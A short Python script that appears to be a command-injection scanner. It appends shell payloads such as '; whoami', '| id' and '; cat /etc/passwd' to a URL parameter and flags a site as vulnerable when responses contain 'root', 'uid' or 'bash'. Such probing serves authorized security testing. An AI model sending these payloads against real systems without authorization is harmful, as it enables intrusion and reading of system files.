import requests
import re
def is_command_injection_vulnerable(url):
    payloads = [
        "; ls", "; whoami", "| ls", "| whoami", "; cat /etc/passwd", "| id", "| uname -a",
        "; ping -c 4 127.0.0.1"
    ]
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.get(url + "?input=" + payload)
            if response.status_code == 200 and any(term in response.text for term in ["root", "uid", "bash"]):
                print(f"Command Injection payload '{payload}' worked.")
                vulnerable = True
        except requests.RequestException as e:
            print(f"Error with payload '{payload}': {e}")
    return vulnerable

